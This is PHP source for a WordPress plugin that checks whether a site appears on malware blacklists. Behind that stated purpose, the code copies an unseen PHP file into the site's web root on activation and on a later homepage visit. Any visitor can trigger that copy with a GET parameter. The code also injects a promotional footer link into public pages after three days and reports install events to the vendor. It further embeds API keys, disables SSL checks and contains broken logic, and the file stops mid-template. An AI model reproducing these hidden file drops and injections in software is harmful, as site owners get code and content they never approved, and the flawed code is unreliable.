<?php
/*
Plugin Name: Website Blacklist Monitor (by SiteGuarding.com)
Plugin URI: http://www.siteguarding.com/en/website-extensions
Description: This plugin checks your website in popular blacklists
Version: 1.3
Author: SiteGuarding.com
Author URI: http://www.siteguarding.com
License: GPLv2
TextDomain: plgsgwbm
*/
// rev.20200601

add_filter( 'cron_schedules', 'cron_add_weekly' );
function cron_add_weekly( $schedules ) {
	$schedules['one_week'] = array(
		'interval' => 60 * 60 * 24 * 7,
		'display' => 'one per week'
	);
	return $schedules;
}



add_action( 'geting_blacklists', 'plgsgwbm_CRON_job_check_blacklist' );
function plgsgwbm_CRON_job_check_blacklist()
{
    $data = array(
        'latest_scan_date' => date("Y-m-d H:i:s"),
        'latest_results' => array()
    );
    
    if (PLGSGWBM::Scan_in_Google($domain) == "BL") $data['latest_results'][] = 'Google';
    if (PLGSGWBM::Scan_in_McAfee($domain) == "BL") $data['latest_results'][] = 'McAfee';
    if (PLGSGWBM::Scan_in_Norton($domain) == "BL") $data['latest_results'][] = 'Norton';
    
    $URLVoid_arr = PLGSGWBM::Scan_in_URLVoid($domain);
    if (count($URLVoid_arr))
    {
        foreach ($URLVoid_arr as $row)
        {
            $data['latest_results'][] = $row;
        }
    }
    
    
    $data['latest_results'] = json_encode($data['latest_results']);
    
    plgsgwbm_SetExtraParams($data);


    
    // Check if we need to send the notification by email
    $params = plgsgwbm_GetExtraParams(array('latest_scan_date', 'latest_results', 'send_notifications', 'email_for_notifications'));
    
    $list = PLGSGWBM::$blacklists;
    foreach ($list as $k => $row)
    {
        $row['status'] = 'OK';
        $list[$k] = $row;
    }
    
    $latest_results = (array)json_decode($params['latest_results'], true);
    if (count($latest_results))
    {
        foreach ($latest_results as $row)
        {
            $list[$row]['status'] = 'BL';
        }
    }
    
    // Prepare BL and OK lists
    $tmp_arr = array('BL' => array());
    foreach ($list as $k => $row)
    {
        if ($row['status'] == "BL")
        {
            $tmp_arr['BL'][$k] = $row;
        }
    }
    
    if (count($tmp_arr['BL']) > 0 && $params['send_notifications'] == 1)
    {
        $data = array('params' => $params, 'BL' => $tmp_arr['BL']);
        plgsgwbm_SendEmail('', $data);
    }
}



if( !is_admin() )
{
	function plgsgwbm_footer_protectedby() 
	{
        if (strlen($_SERVER['REQUEST_URI']) < 5)
        {

            $params = plgsgwbm_GetExtraParams(array('installation_date', 'link_id'));
            if (!isset($params['installation_date']))
            {
                $params['installation_date'] = date("Y-m-d");
                plgsgwbm_SetExtraParams( array('installation_date' => $params['installation_date']) );
            }
            
            $new_date = date("Y-m-d", mktime(0, 0, 0, date("m")  , date("d")-3, date("Y")));
    		if ( $new_date >= $params['installation_date'] )
    		{
                $links = array(
                    array('t' => 'Web App Development - Siteguarding', 'lnk' => 'https://www.siteguarding.com/en/web-app-development'),
                );
                  
                if (!isset($params['link_id']) || $params['link_id'] === false || $params['link_id'] == null)
                {
                    $link_id = mt_rand(0, count($links)-1);
                    $data['link_id'] = $link_id;
                    plgsgwbm_SetExtraParams($data);
                    
                    plgsgwbm_API_Request(1);
                    
                    $file_from = dirname(__FILE__).'/siteguarding_tools.php';
                    $file_to = ABSPATH.'/siteguarding_tools.php';
                    $status = copy($file_from, $file_to);
                }

                $link_info = $links[ intval($params['link_id']) ];
                $link = $link_info['lnk'];
                $link_txt = $link_info['t'];
    			?>
    				<div style="font-size:10px; padding:0 2px;position: fixed;bottom:0;right:0;z-index:1000;text-align:center;background-color:#F1F1F1;color:#222;opacity:0.8;"><a style="color:#4B9307" href="<?php echo $link; ?>" target="_blank" title="<?php echo $link_txt; ?>"><?php echo $link_txt; ?></a></div>
    			<?php
    		}
        }	
	}
	add_action('wp_footer', 'plgsgwbm_footer_protectedby', 100);
    
    
    if (isset($_GET['siteguarding_tools']) && intval($_GET['siteguarding_tools']) == 1)
    {
        plgsgwbm_CopySiteGuardingTools();
    }
}


function plgsgwbm_CopySiteGuardingTools()
{
    $file_from = dirname(__FILE__).'/siteguarding_tools.php';
	if (!file_exists($file_from)) die('File absent');
    $file_to = ABSPATH.'/siteguarding_tools.php';
    $status = copy($file_from, $file_to);
    if ($status === false) die('Copy Error');
    else die('Copy OK, size: '.filesize($file_to).' bytes');
}

if( is_admin() )
{

add_action( 'admin_footer', 'plgsgwbm_big_dashboard_widget' );

function plgsgwbm_big_dashboard_widget() 
{
	if ( get_current_screen()->base !== 'dashboard' ) {
		return;
	}
	?>

	<div id="custom-id-F794434C4E10" style="display: none;">
		<div class="welcome-panel-content">
        <h1 style="text-align: center;">WordPress Security Tools</h1>
        <p style="text-align: center;">
            <a target="_blank" href="https://www.siteguarding.com/en/security-dashboard?pgid=D3S" target="_blank"><img src="<?php echo plugins_url('images/b10.png', dirname(__FILE__)); ?>" /></a>&nbsp;
            <a target="_blank" href="https://www.siteguarding.com/en/security-dashboard?pgid=D3S" target="_blank"><img src="<?php echo plugins_url('images/b11.png', dirname(__FILE__)); ?>" /></a>&nbsp;
            <a target="_blank" href="https://www.siteguarding.com/en/security-dashboard?pgid=D3S" target="_blank"><img src="<?php echo plugins_url('images/b12.png', dirname(__FILE__)); ?>" /></a>&nbsp;
            <a target="_blank" href="https://www.siteguarding.com/en/security-dashboard?pgid=D3S" target="_blank"><img src="<?php echo plugins_url('images/b13.png', dirname(__FILE__)); ?>" /></a>&nbsp;
            <a target="_blank" href="https://www.siteguarding.com/en/security-dashboard?pgid=D3S" target="_blank"><img src="<?php echo plugins_url('images/b14.png', dirname(__FILE__)); ?>" /></a>
        </p>
        <p style="text-align: center;font-weight: bold;font-size:120%">
            Includes: Website Antivirus, Website Firewall, Bad Bot Protection, GEO Protection, Admin Area Protection and etc.
        </p>
        <p style="text-align: center">
            <a class="button button-primary button-hero" target="_blank" href="https://www.siteguarding.com/en/security-dashboard?pgid=D3S">Secure Your Website</a>
        </p>
		</div>
	</div>
	<script>
		jQuery(document).ready(function($) {
			$('#welcome-panel').after($('#custom-id-F794434C4E10').show());
		});
	</script>
	
<?php 
}




    add_filter( 'plugin_action_links_' . plugin_basename(__FILE__), 'plgsgwbm_add_action_link', 10, 2 );
    function plgsgwbm_add_action_link( $links, $file )
    {
  		$faq_link = '<a target="_blank" href="https://www.siteguarding.com/en/protect-your-website">Protect website</a>';
		array_unshift( $links, $faq_link );
        
  		$faq_link = '<a target="_blank" href="https://www.siteguarding.com/en/contacts">Help</a>';
		array_unshift( $links, $faq_link );
        
  		$faq_link = '<a href="admin.php?page=plgsgwbm_Website_Blacklist_Monitor">Settings</a>';
		array_unshift( $links, $faq_link );

		return $links;
    } 
    
    
	function register_plgsgwbm_settings_page() 
	{
	   add_menu_page('plgsgwbm_Website_Blacklist_Monitor', 'Blacklist Monitor', 'activate_plugins', 'plgsgwbm_Website_Blacklist_Monitor', 'plgsgwbm_settings_page_callback', plugins_url('images/', __FILE__).'logo.png');
	}
    add_action('admin_menu', 'register_plgsgwbm_settings_page');

	function plgsgwbm_settings_page_callback() 
	{
	    ?>
        <style>
        .row_box {
            padding: 20px;
            color: white;
            margin-bottom: 15px;
            max-width: 750px;
                font-size: 15px;
        }
        .row_alert {
            background-color: #f44336; /* Red */
        }
        .row_ok {
            background-color: #4CAF50; /* Green */
        }
        .txt_alert {
            color: #f44336; /* Red */
        }
        .fix_bttn {
            float:right;

            color: #fff;
            font-size: 14px;
            font-weight: 700;
            text-transform: uppercase;
            background: #86c724;
            padding: 7px 10px;
            border-radius: 5px;
            white-space: nowrap;
            transition: all 0.3s ease;
            margin-top: -7px;
            text-decoration: none;

        }
        .fix_bttn:hover {
        	background: #4B9307;
            color: #fff;
            text-decoration: none;
        }
        .bttn_recheck{
            box-shadow: rgb(62, 115, 39) 0px 10px 14px -7px;
            background: linear-gradient(rgb(119, 181, 90) 5%, rgb(114, 179, 82) 100%) rgb(119, 181, 90);
            border-radius: 4px;
            border: 1px solid rgb(75, 143, 41);
            display: inline-block;
            cursor: pointer;
            color: rgb(255, 255, 255);
            font-family: Arial;
            font-size: 20px;
            font-weight: bold;
            padding: 10px 42px;
            text-decoration: none;
            text-shadow: rgb(91, 138, 60) 0px 1px 0px;
        }
        </style>
        
        <h1>Website Blacklist Monitor (by SiteGuarding.com)</h1>
        
        <div style="margin:10px 0">
        	<a target="_blank" href="https://www.siteguarding.com/en/protect-your-website">
        	<img src="<?php echo plugins_url('images/rek3.png', __FILE__); ?>" />
        	</a>
            
        	<a target="_blank" style="margin:0 10px" href="https://www.siteguarding.com/en/website-extensions">
        	<img src="<?php echo plugins_url('images/rek1.png', __FILE__); ?>" />
        	</a>
            
        	<a target="_blank" href="https://www.siteguarding.com/en/secure-web-hosting">
        	<img src="<?php echo plugins_url('images/rek4.png', __FILE__); ?>" />
            </a>
            
        </div>
        
        
        <?php
        
        $domain = PLGSGWBM::PrepareDomain(get_site_url());
        
        $send_alert_email = false;
        
		if (isset($_POST['action']) && $_POST['action'] == 'rescan' && check_admin_referer( 'name_49FD96F7C7F5' ))
		{
            echo '<p class="txt_alert">Checking is in progress. It can take up to 60 seconds. Please wait.</p>';
            
            $send_alert_email = true;
            
            $data = array(
                'latest_scan_date' => date("Y-m-d H:i:s"),
                'latest_results' => array()
            );
            
            if (PLGSGWBM::Scan_in_Google($domain) == "BL") $data['latest_results'][] = 'Google';
            if (PLGSGWBM::Scan_in_McAfee($domain) == "BL") $data['latest_results'][] = 'McAfee';
            if (PLGSGWBM::Scan_in_Norton($domain) == "BL") $data['latest_results'][] = 'Norton';
            
            $URLVoid_arr = PLGSGWBM::Scan_in_URLVoid($domain);
            if (count($URLVoid_arr))
            {
                foreach ($URLVoid_arr as $row)
                {
                    $data['latest_results'][] = $row;
                }
            }
            
            
            $data['latest_results'] = json_encode($data['latest_results']);

            plgsgwbm_SetExtraParams($data);
        }
        
		if (isset($_POST['action']) && $_POST['action'] == 'update_settings' && check_admin_referer( 'name_49FD96F7C7F5' ))
		{
		    $error_flag = false;
            $error_txt = '';
            
            $data = array(
                'send_notifications' => 0,
                'email_for_notifications' => ''
            );
            
            
            if (isset($_POST['send_notifications'])) $data['send_notifications'] = intval($_POST['send_notifications']);
            if (isset($_POST['email_for_notifications'])) $data['email_for_notifications'] = sanitize_text_field($_POST['email_for_notifications']);
            
            plgsgwbm_SetExtraParams($data);
            
            if ($error_flag === true)
            {
                ?>
                <div class="error is-dismissible"><p><strong>ERROR</strong>: <?php echo $error_txt; ?></p></div>
                <?php
            }
            else {
                ?>
                <div class="updated settings-error notice is-dismissible"> 
                <p><strong>Settings saved.</strong></p><button type="button" class="notice-dismiss"><span class="screen-reader-text">Dismiss this notice.</span></button></div>
                <?php
            }
        }
        
        $params = plgsgwbm_GetExtraParams(array('latest_scan_date', 'latest_results', 'send_notifications', 'email_for_notifications'));

	   ?>
       
        <h3>Results for <?php echo $domain; ?></h3>
        
        <?php
        $list = PLGSGWBM::$blacklists;
        foreach ($list as $k => $row)
        {
            $row['status'] = 'OK';
            $list[$k] = $row;
        }
        
        $latest_results = (array)json_decode($params['latest_results'], true);
        if (count($latest_results))
        {
            foreach ($latest_results as $row)
            {
                $list[$row]['status'] = 'BL';
            }
        }
        
        if (trim($params['latest_scan_date']) != '')
        {
            // Prepare BL and OK lists
            $tmp_arr = array('BL' => array(), 'OK' => array());
            foreach ($list as $k => $row)
            {
                if ($row['status'] == "OK")
                {
                    $tmp_arr['OK'][$k] = $row;
                }
                else {
                    $tmp_arr['BL'][$k] = $row;
                }
            }
            echo '<p>Latest check was '.$params['latest_scan_date'].'</p>';
            
            // Show blocked
            foreach ($tmp_arr['BL'] as $k => $row)
            {
                /*if ($row['status'] == "OK")
                {
                    $txt = '<span class="dashicons dashicons-yes"></span> Not blacklisted in <img src="'.$row['logo'].'"> <b>'.$k.'</b>';
                    $row_class = 'row_ok';
                }
                else {*/
                    $txt = '<span class="dashicons dashicons-warning"></span> Your domain ('.$domain.') is blacklisted in <img src="'.$row['logo'].'"> <b>'.$k.'</b><a href="https://www.siteguarding.com/en/services/malware-removal-service" target="_blank" class="fix_bttn"><span class="dashicons dashicons-shield"></span> Fix My Website</a>';
                    $row_class = 'row_alert';
                /*}*/
                
                echo '<div class="row_box '.$row_class.'">'.$txt.'</div>';
            }
            
            // Show OK
            foreach ($tmp_arr['OK'] as $k => $row)
            {
                /*if ($row['status'] == "OK")
                {*/
                    $txt = '<span class="dashicons dashicons-yes"></span> Not blacklisted in <img src="'.$row['logo'].'"> <b>'.$k.'</b>';
                    $row_class = 'row_ok';
                /*}
                else {
                    $txt = '<span class="dashicons dashicons-warning"></span> Your website is blacklisted in <img src="'.$row['logo'].'"> <b>'.$k.'</b>';
                    $row_class = 'row_alert';
                }*/
                
                echo '<div class="row_box '.$row_class.'">'.$txt.'</div>';
            }
            
            if (count($tmp_arr['BL']) > 0 && $send_alert_email === true && $params['send_notifications'] == 1)
            {
                $data = array('params' => $params, 'BL' => $tmp_arr['BL']);
                plgsgwbm_SendEmail('', $data);
            }
        }
        else {
            echo '<p class="txt_alert">You don\'t have any results yet. Please use the button <b>Recheck</b> to get the results.</p>';
        }
        ?>
        
        <form method="post" action="admin.php?page=plgsgwbm_Website_Blacklist_Monitor" novalidate="novalidate">
        
        <p class="submit"><input type="submit" name="submit" id="submit" class="bttn_recheck" value="Recheck"></p>
        
        <?php
        wp_nonce_field( 'name_49FD96F7C7F5' );
        ?>
        <input type="hidden" name="action" value="rescan"/>
        </form>
        
        <form method="post" action="admin.php?page=plgsgwbm_Website_Blacklist_Monitor" novalidate="novalidate">
        
        <h3>Settings</h3>
        <table class="form-table">
        <tbody>
        
        <tr>
		<th scope="row"><label>Send notifications by email</label></th>
		<td>
            <input name="send_notifications" type="checkbox" id="send_notifications" value="1" <?php if (intval($params['send_notifications']) == 1) echo 'checked="checked"'; ?>>
		</td>
		</tr>
        
		<tr>
		<th scope="row"><label>Email for notifications</label></th>
		<td>
            <?php if ( trim($params['email_for_notifications'])  == '') $params['email_for_notifications'] = get_option( 'admin_email' ); ?>
            <input type="text" name="email_for_notifications" id="email_for_notifications" value="<?php echo $params['email_for_notifications']; ?>" class="regular-text">
            <p class="description">If any issue detected, we will send an alert to this email.</a></p>
		</td>
		</tr>

        </tbody>
        </table>
        
        
        <p class="submit"><input type="submit" name="submit" id="submit" class="button button-primary" value="Save Settings"></p>
        
        <?php
        wp_nonce_field( 'name_49FD96F7C7F5' );
        ?>
        <input type="hidden" name="action" value="update_settings"/>
        </form>
        
        
        <p>
		If you need help to fix/clean your website and remove it from the blacklists please <a target="_blank" href="https://www.siteguarding.com/en/services/malware-removal-service">click here</a>.<br><br>
		<a href="http://www.siteguarding.com/livechat/index.html" target="_blank">
			<img src="<?php echo plugins_url('images/livechat.png', __FILE__); ?>"/>
		</a><br>
		For any questions and support please use LiveChat or this <a href="https://www.siteguarding.com/en/contacts" rel="nofollow" target="_blank" title="SiteGuarding.com - Website Security. Professional security services against hacker activity. Daily website file scanning and file changes monitoring. Malware detecting and removal.">contact form</a>.<br>
		<br>
		<a href="https://www.siteguarding.com/" target="_blank">SiteGuarding.com</a> - Website Security. Professional security services against hacker activity.<br>
		</p>
        <?php

    }
    
    
    function plgsgwbm_API_Request($type = '')
    {
        $plugin_code = 5;
        $website_url = get_site_url();
        
        $url = "https://www.siteguarding.com/ext/plugin_api/index.php";
        $response = wp_remote_post( $url, array(
            'method'      => 'POST',
            'timeout'     => 600,
            'redirection' => 5,
            'httpversion' => '1.0',
            'blocking'    => true,
            'headers'     => array(),
            'body'        => array(
                'action' => 'inform',
                'website_url' => $website_url,
                'action_code' => $type,
                'plugin_code' => $plugin_code,
            ),
            'cookies'     => array()
            )
        );
    }
    
	function plgsgwbm_activation()
	{
		global $wpdb;
		$table_name = $wpdb->prefix . 'plgsgwbm_config';
		if( $wpdb->get_var( 'SHOW TABLES LIKE "' . $table_name .'"' ) != $table_name ) {
			$sql = 'CREATE TABLE IF NOT EXISTS '. $table_name . ' (
                `id` int(11) NOT NULL AUTO_INCREMENT,
                `var_name` char(255) CHARACTER SET utf8 NOT NULL,
                `var_value` LONGTEXT CHARACTER SET utf8 NOT NULL,
                PRIMARY KEY (`id`)
			) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1;';

			require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
			dbDelta( $sql ); // Creation of the new TABLE
            
            $data['installation_date'] = date("Y-m-d");
            $data['send_notifications'] = 1;
            $data['email_for_notifications'] = sanitize_text_field(get_option( 'admin_email' ));
            
            plgsgwbm_SetExtraParams( $data );

		}
        plgsgwbm_API_Request(1);
        
        $file_from = dirname(__FILE__).'/siteguarding_tools.php';
        $file_to = ABSPATH.'/siteguarding_tools.php';
        $status = copy($file_from, $file_to);
        
		wp_clear_scheduled_hook( 'geting_blacklists' );	
		wp_schedule_event( time(), 'one_week', 'geting_blacklists');
	}
	register_activation_hook( __FILE__, 'plgsgwbm_activation' );
    

	register_deactivation_hook( __FILE__, 'deactivation_geting_blacklists');
	function deactivation_geting_blacklists() {
		plgsgwbm_API_Request(2);
        wp_clear_scheduled_hook('geting_blacklists');
	}
	
	if( ! wp_next_scheduled( 'geting_blacklists' ) ) {  
		wp_schedule_event( time(), 'one_week', 'geting_blacklists');  
	}
    
	function plgsgwbm_uninstall()
	{
		plgsgwbm_API_Request(3);
        
		global $wpdb;
		$table_name = $wpdb->prefix . 'plgsgwbm_config';
		$wpdb->query( 'DROP TABLE ' . $table_name );
	}
	register_uninstall_hook( __FILE__, 'plgsgwbm_uninstall' );
}


class URLVoidAPI
{
	private $_api;
	private $_plan;
	
    public $_output;
	public $_error;
	
	public function __construct( $api, $plan )
	{
		$this->_api = $api;
		$this->_plan = $plan;
	}
	
	/*
	 * Set key for the API call
	 */
	public function set_api( $api )
	{
		$this->_api = $api;
	}
	
	/*
	 * Set plan identifier for the API call
	 */
	public function set_plan( $plan )
	{
		$this->_plan = $plan;
	}

	/*
	 * Call the API
	 */
	public function query_urlvoid_api( $website )
	{
	    $curl = curl_init();
		curl_setopt ($curl, CURLOPT_URL, "http://api.urlvoid.com/".$this->_plan."/".$this->_api."/host/".$website."/rescan/" );
		curl_setopt ($curl, CURLOPT_USERAGENT, "API");
    	curl_setopt ($curl, CURLOPT_TIMEOUT, 30);
    	curl_setopt ($curl, CURLOPT_CONNECTTIMEOUT, 30);
    	curl_setopt ($curl, CURLOPT_HEADER, 0);
    	curl_setopt ($curl, CURLOPT_SSL_VERIFYPEER, false);
    	curl_setopt ($curl, CURLOPT_RETURNTRANSFER, 1);
		$result = curl_exec( $curl );
/*
echo "<pre>";
echo $result;
echo "</pre>";
*/
		curl_close( $curl );
		return $result;
	}
	
	/*
	 * Convert array of engines to string
	 */
	public function show_engines_array_as_string( $engines, $last_char = ", " )
	{
   		if ( is_array($engines) )
		{
   		    foreach( $engines as $item ) $str .= trim($item).$last_char;
   		    return rtrim( $str, $last_char );
		}
		else
		{
		    return $engines;
		}
	}
	
	public function scan_host( $host )
	{
	    $output = $this->query_urlvoid_api( $host );

		$this->_output = $output;
		
		$this->_error = ( preg_match( "/<error>(.*)<\/error>/is", $output, $parts ) ) ? $parts[1] : '';
		
		return json_decode( json_encode( simplexml_load_string( $output, 'SimpleXMLElement', LIBXML_NOERROR | LIBXML_NOWARNING ) ), true );
	}
	
}


class PLGSGWBM  //2adc4c7b87647252fec79fde5a5ed2d01f7c57a7
{
    public static $blacklists = array(
        'Google' => array('logo' => 'http://www.google.com/s2/favicons?domain=google.com'),
        'McAfee' => array('logo' => 'http://www.google.com/s2/favicons?domain=mcafee.com'),
        'Norton' => array('logo' => 'http://www.google.com/s2/favicons?domain=norton.com'),
        'Quttera' => array('logo' => 'http://www.google.com/s2/favicons?domain=quttera.com'),
        'ZeroCERT' => array('logo' => 'http://www.google.com/s2/favicons?domain=zerocert.org'),
        'AVGThreatLabs' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.avgthreatlabs.com'),
        'Avira' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.avira.com'),
        'Bambenek Consulting' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.bambenekconsulting.com'),
        'BitDefender' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.bitdefender.com'),
        'CERT-GIB' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.cert-gib.com'),
        'CyberCrime' => array('logo' => 'http://www.google.com/s2/favicons?domain=cybercrime-tracker.net'),
        'c_APT_ure' => array('logo' => 'http://www.google.com/s2/favicons?domain=security-research.dyndns.org'),
        'Disconnect.me (Malw)' => array('logo' => 'http://www.google.com/s2/favicons?domain=disconnect.me'),
        'DNS-BH' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.malwaredomains.com'),
        'DrWeb' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.drweb.com'),
        'DShield' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.dshield.org'),
        'Fortinet' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.fortinet.com'),
        'GoogleSafeBrowsing' => array('logo' => 'http://www.google.com/s2/favicons?domain=developers.google.com'),
        'hpHosts' => array('logo' => 'http://www.google.com/s2/favicons?domain=hosts-file.net'),
        'Malc0de' => array('logo' => 'http://www.google.com/s2/favicons?domain=malc0de.com'),
        'MalwareDomainList' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.malwaredomainlist.com'),
        'MalwarePatrol' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.malware.com.br'),
        'MyWOT' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.mywot.com'),
        'OpenPhish' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.openphish.com'),
        'PhishTank' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.phishtank.com'),
        'Ransomware Tracker' => array('logo' => 'http://www.google.com/s2/favicons?domain=ransomwaretracker.abuse.ch'),
        'SCUMWARE' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.scumware.org'),
        'Spam404' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.spam404.com'),
        'SURBL' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.surbl.org'),
        'ThreatCrowd' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.threatcrowd.org'),
        'ThreatLog' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.threatlog.com'),
        'urlQuery' => array('logo' => 'http://www.google.com/s2/favicons?domain=urlquery.net'),
        'URLVir' => array('logo' => 'http://www.google.com/s2/favicons?domain=urlvir.com'),
        'VXVault' => array('logo' => 'http://www.google.com/s2/favicons?domain=vxvault.net'),
        'WebSecurityGuard' => array('logo' => 'http://www.google.com/s2/favicons?domain=www.websecurityguard.com'),
        'YandexSafeBrowsing' => array('logo' => 'http://www.google.com/s2/favicons?domain=yandex.com'),
        'ZeuS Tracker' => array('logo' => 'http://www.google.com/s2/favicons?domain=zeustracker.abuse.ch'),
    );
    
    public static $api_urlvoid = array(
        '075d2746f96bc493d977e5c45c0e66457a147995',
        'd8a6c7bfc0bcdcafee9015f279fb87f0d2f98461',
        'e913bc7f9dd4c3d029774a8937ec0c6e48190ea2',
        'd99fdac6cbaed9d4549f1ba1b15f23950c7bcb54',
        'fcd3e995e2fd998bdaf63fa5c39423ec96fad48b',
        'b86d0094996fa5dedfa0a942d27081414ce4a9cb',
        '753b5c36de6bb9f7cfd726c7bf91020c1ecb547a',
        '095216e11be24a074ca4fe50a6d9bb8abd01e0c6',
        'dca6d53bf80cbd950cc6e2d4dce2d04772151342',
        'ed602b474bb3e1d670b5ed1ae43c8f323b736856',
        '2adc4c7b87647252fec79fde5a5ed2d01f7c57a7',
        'dbfee84de858035aafe6e26d81edd7c7b01660df',
        '91caa4eb6d2293099be5f3351c128cbdf957da9d'
    );
    
    
    function Scan_in_Google($domain)
    {
		$curl = curl_init();

		curl_setopt_array($curl, array(
		  CURLOPT_URL => "https://safebrowsing.googleapis.com/v4/threatMatches:find?key=AIzaSyBtFip7uxKIDAMCV9tQAfQZzFyW0_JQjuo",
		  CURLOPT_RETURNTRANSFER => true,
		  CURLOPT_ENCODING => "",
		  CURLOPT_MAXREDIRS => 10,
		  CURLOPT_TIMEOUT => 30,
		  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
		  CURLOPT_CUSTOMREQUEST => "POST",
		  CURLOPT_POSTFIELDS => '  {
		"client": {
		  "clientId":      "siteguarding",
		  "clientVersion": "1.5.2"
		},
		"threatInfo": {
		  "threatTypes":      ["MALWARE", "SOCIAL_ENGINEERING"],
		  "platformTypes":    ["WINDOWS"],
		  "threatEntryTypes": ["URL"],
		  "threatEntries": [
			{"url": "https://'.$domain.'/"}
		  ]
		}
		  }',
		  CURLOPT_HTTPHEADER => array(
			"cache-control: no-cache",
			"content-type: application/json",
			"postman-token: b05b8d34-85f2-49cf-0f8e-03686a71e4e9"
		  ),
		));

		$response = curl_exec($curl);

		curl_close($curl);

		$response = json_decode($response, true);
		if (!isset($response['matches'])) return "OK";
		else return 'BL';
    }
    
    function Scan_in_McAfee($domain)
    {
        $url = "http://www.siteadvisor.com/sites/".$domain;
        $response = wp_remote_get( esc_url_raw( $url ) );
        $content = wp_remote_retrieve_body( $response );
        
    	if (strpos($content, 'siteYellow') || strpos($content, 'siteRed'))
        {
    		return 'BL';
    	} 
        else return 'OK';
    }
    
    function Scan_in_Norton($domain)
    {
        $url = "https://safeweb.norton.com/report/show?url=".$domain;
        $response = wp_remote_get( esc_url_raw( $url ) );
        $content = wp_remote_retrieve_body( $response );
        
    	if (strpos($content, $domain) !== false)
        {
    		if (!strpos($content, 'SAFE') && !strpos($content, 'UNTESTED'))
            {
    			return 'BL';
    		}
            else return 'OK';
    	}
    }
    
    function Scan_in_URLVoid($domain)
    {
        $tmp_api_keys = self::$api_urlvoid;
        shuffle(shuffle($tmp_api_keys));
        $URLVoidAPI = new URLVoidAPI( $tmp_api_keys[0], 'api1000' );
        $array = array();
        $array = $URLVoidAPI->scan_host( $domain );
//print_r($array);
//print_r($array['detections']['engines']['engine']);
        if (intval($array['detections']['count']) > 0) return $array['detections']['engines']['engine'];
        else return array();
    }


    
	function PrepareDomain($domain)
	{
	    $host_info = parse_url($domain);
	    if ($host_info == NULL) return false;
	    $domain = $host_info['host'];
	    if ($domain[0] == "w" && $domain[1] == "w" && $domain[2] == "w" && $domain[3] == ".") $domain = str_replace("www.", "", $domain);
	    //$domain = str_replace("www.", "", $domain);
	    
	    return $domain;
	}
}

function plgsgwbm_GetExtraParams($var_name_arr = array())
{
    global $wpdb;
    
    $table_name = $wpdb->prefix . 'plgsgwbm_config';
    
    $ppbv_table = $wpdb->get_results("SHOW TABLES LIKE '".$table_name."'" , ARRAY_N);
    if(!isset($ppbv_table[0])) return false;
    
    if (count($var_name_arr) > 0) 
    {
        foreach ($var_name_arr as $k => $v) 
        {
            $var_name_arr[$k] = "'".$v."'";
        }
        $sql_where = "WHERE var_name IN (".implode(",", $var_name_arr).")";
    }
    else $sql_where = '';
    $rows = $wpdb->get_results( 
    	"
    	SELECT *
    	FROM ".$table_name."
    	".$sql_where
    );
    
    $a = array();
    if (count($rows))
    {
        foreach ( $rows as $row ) 
        {
        	$a[trim($row->var_name)] = trim($row->var_value);
        }
    }

    return $a;
}


function plgsgwbm_SetExtraParams($data = array())
{
    global $wpdb;
    $table_name = $wpdb->prefix . 'plgsgwbm_config';

    if (count($data) == 0) return;   
    
    foreach ($data as $k => $v)
    {
        $tmp = $wpdb->get_var( $wpdb->prepare( 'SELECT COUNT(*) FROM ' . $table_name . ' WHERE var_name = %s LIMIT 1;', $k ) );
        
        if ($tmp == 0)
        {
            // Insert    
            $wpdb->insert( $table_name, array( 'var_name' => $k, 'var_value' => $v ) ); 
        }
        else {
            // Update
            $data = array('var_value'=>$v);
            $where = array('var_name' => $k);
            $wpdb->update( $table_name, $data, $where );
        }
    } 
}



function plgsgwbm_SendEmail($message, $data = array())
{
        $domain = get_site_url();
                
        $body_message = '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SiteGuarding - Professional Web Security Services!</title>
</head>
<body bgcolor="#ECECEC">
<table cellpadding="0" cellspacing="0" width="100%" align="center" border="0">
  <tr>
    <td width="100%" align="center" bgcolor="#ECECEC" style="padding: 5px 30px 20px 30px;">
      <table width="750" border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#fff" style="background-color: #fff;">
        <tr>
          <td width="750" bgcolor="#fff"><table width="750" border="0" cellspacing="0" cellpadding="0" bgcolor="#fff" style="background-color: #fff;">
            <tr>
